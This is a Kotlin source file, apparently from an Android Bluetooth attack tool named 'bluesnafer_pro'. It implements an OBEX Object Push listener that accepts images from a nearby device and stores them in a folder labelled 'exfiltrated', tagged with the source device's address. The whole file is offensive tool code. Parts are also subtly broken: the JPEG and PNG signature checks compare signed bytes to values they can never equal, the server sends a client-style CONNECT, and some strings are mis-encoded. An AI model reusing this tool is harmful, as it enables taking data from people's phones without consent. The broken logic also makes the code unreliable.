package com.bluesnafer_pro

import android.bluetooth.*
import android.util.Log
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object OPPServerMode {
    private const val TAG = "OPPServerMode"
    private val OPP_UUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")

    fun waitForIncomingImages(device: BluetoothDevice, timeoutSec: Int = 30, maxImages: Int = 10): Map<String, Any> {
        Log.d(TAG, "OPP server mode waiting for images from ${device.address}")
        val receivedImages = mutableListOf<Map<String, Any>>()
        var serverSocket: BluetoothServerSocket? = null
        var clientSocket: BluetoothSocket? = null

        return try {
            serverSocket = BluetoothAdapter.getDefaultAdapter()?.listenUsingInsecureRfcommWithServiceRecord("OPP_Server", OPP_UUID)

            val acceptLatch = CountDownLatch(1)
            var acceptedSocket: BluetoothSocket? = null

            Thread {
                try {
                    acceptedSocket = serverSocket?.accept(timeoutSec * 1000)
                } catch (_: IOException) {}
                acceptLatch.countDown()
            }.apply { start() }

            if (!acceptLatch.await((timeoutSec + 5).toLong(), TimeUnit.SECONDS)) {
                return mapOf("success" to false, "message" to "OPP server: no client connected within timeout")
            }

            clientSocket = acceptedSocket ?: return mapOf("success" to false, "error" to "Socket null")

            val input = clientSocket.inputStream
            val output = clientSocket.outputStream

            val (connectCode, maxPacket) = obexConnect(input, output)
            if (connectCode != 0xA0) {
                return mapOf("success" to false, "error" to "OPP connect rejected: 0x${Integer.toHexString(connectCode)}")
            }

            Log.d(TAG, "OPP client connected, waiting for PUT requests...")

            val deadline = System.currentTimeMillis() + (timeoutSec * 1000L)
            while (System.currentTimeMillis() < deadline && receivedImages.size < maxImages) {
                val header = ByteArray(3)
                val read = readAll(input, header, 3, 2000)
                if (read < 3) break

                val opcode = header[0].toInt() and 0xFF
                if (opcode == 0x02) {
                    val length = ((header[1].toInt() and 0xFF) shl 8) or (header[2].toInt() and 0xFF)
                    val body = ByteArray(length - 3)
                    val bodyRead = readAll(input, body, body.size, 5000)
                    if (bodyRead < 1) break

                    val name = extractNameFromHeaders(body) ?: "unknown_${receivedImages.size}.jpg"
                    val imageData = extractBodyFromHeaders(body) ?: byteArrayOf()

                    if (imageData.isNotEmpty() && isImageData(imageData)) {
                        val ctx = BluetoothMethodHandler.getAppContext()
                        if (ctx != null) {
                            val dir = File(File(ctx.filesDir, "exfiltrated"), "opp_received")
                            dir.mkdirs()
                            val safeName = "opp_${System.currentTimeMillis()}_${receivedImages.size}.jpg"
                            val outFile = File(dir, safeName)
                            outFile.writeBytes(imageData)
                            receivedImages.add(
                                mapOf(
                                    "name" to name,
                                    "size" to imageData.size.toLong(),
                                    "localPath" to outFile.absolutePath,
                                    "remotePath" to "opp_server://${device.address}/$name",
                                    "mimeType" to detectMimeType(imageData),
                                    "method" to "opp_server_mode"
                                )
                            )
                            Log.d(TAG, "OPP received image: $name (${imageData.size} bytes)")
                        }
                    }

                    val respCode = 0xA0
                    output.write(byteArrayOf(respCode.toByte(), 0x00, 0x03, 0x00, 0x00, 0x00))
                    output.flush()
                } else if (opcode == 0x80) {
                    break
                } else {
                    val remaining = ByteArray(maxPacket)
                    readAll(input, remaining, remaining.size, 500)
                }
            }

            clientSocket?.close()
            serverSocket?.close()

            mapOf(
                "success" to receivedImages.isNotEmpty(),
                "images" to receivedImages,
                "imagesCount" to receivedImages.size,
                "totalBytes" to receivedImages.fold(0L) { acc, img -> acc + ((img["size"] as? Long ?: 0)) },
                "method" to "opp_server_mode",
                "message" to if (receivedImages.isNotEmpty()) "OPP server: ${receivedImages.size} im�genes recibidas" else "OPP server: sin im�genes recibidas"
            )
        } catch (e: Exception) {
            Log.e(TAG, "OPP server error: ${e.message}")
            mapOf("success" to false, "error" to (e.message ?: "unknown error"), "method" to "opp_server_mode")
        } finally {
            try { clientSocket?.close() } catch (_: Exception) {}
            try { serverSocket?.close() } catch (_: Exception) {}
        }
    }

    private fun obexConnect(input: InputStream, output: OutputStream): Pair<Int, Int> {
        val connect = byteArrayOf(0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x40, 0x00)
        output.write(connect)
        output.flush()
        val resp = ByteArray(7)
        val read = readAll(input, resp, 7, 5000)
        if (read < 3) return Pair(-1, 4096)
        val responseCode = resp[0].toInt() and 0xFF
        val maxPacket = if (resp.size > 6) {
            ((resp[5].toInt() and 0xFF) shl 8) or (resp[6].toInt() and 0xFF)
        } else 4096
        return Pair(responseCode, maxPacket.coerceAtMost(16384))
    }

    private fun extractNameFromHeaders(data: ByteArray): String? {
        var offset = 0
        while (offset < data.size) {
            val headerId = data[offset].toInt() and 0xFF
            if (headerId == 0x01) {
                val len = ((data[offset + 1].toInt() and 0xFF) shl 8) or (data[offset + 2].toInt() and 0xFF)
                val nameBytes = data.copyOfRange(offset + 3, offset + len)
                return String(nameBytes, Charsets.UTF_8).trimEnd('\u0000')
            }
            if (offset + 2 >= data.size) break
            val len = ((data[offset + 1].toInt() and 0xFF) shl 8) or (data[offset + 2].toInt() and 0xFF)
            offset += len
        }
        return null
    }

    private fun extractBodyFromHeaders(data: ByteArray): ByteArray? {
        var offset = 0
        while (offset < data.size) {
            val headerId = data[offset].toInt() and 0xFF
            if (headerId == 0x48 || headerId == 0x49) {
                val len = ((data[offset + 1].toInt() and 0xFF) shl 8) or (data[offset + 2].toInt() and 0xFF)
                return data.copyOfRange(offset + 3, offset + len)
            }
            if (offset + 2 >= data.size) break
            val len = ((data[offset + 1].toInt() and 0xFF) shl 8) or (data[offset + 2].toInt() and 0xFF)
            offset += len
        }
        return null
    }

    private fun isImageData(data: ByteArray): Boolean {
        if (data.size < 2) return false
        return (data[0].toInt() == 0xFF && data[1].toInt() == 0xD8) ||
            (data[0].toInt() == 0x89 && data[1].toInt() == 0x50) ||
            (data[0].toInt() == 0x47 && data[1].toInt() == 0x49) ||
            (data[0].toInt() == 0x42 && data[1].toInt() == 0x4D)
    }

    private fun detectMimeType(data: ByteArray): String {
        if (data.size < 2) return "image/unknown"
        return when {
            data[0].toInt() == 0xFF && data[1].toInt() == 0xD8 -> "image/jpeg"
            data[0].toInt() == 0x89 && data[1].toInt() == 0x50 -> "image/png"
            data[0].toInt() == 0x47 && data[1].toInt() == 0x49 -> "image/gif"
            data[0].toInt() == 0x42 && data[1].toInt() == 0x4D -> "image/bmp"
            else -> "image/unknown"
        }
    }

    private fun readAll(input: InputStream, buffer: ByteArray, maxLen: Int, timeoutMs: Int): Int {
        var total = 0
        val deadline = System.currentTimeMillis() + timeoutMs
        while (total < maxLen && System.currentTimeMillis() < deadline) {
            val read = try { input.read(buffer, total, maxLen - total) } catch (_: Exception) { -1 }
            if (read < 0) break
            total += read
        }
        return total
    }
}
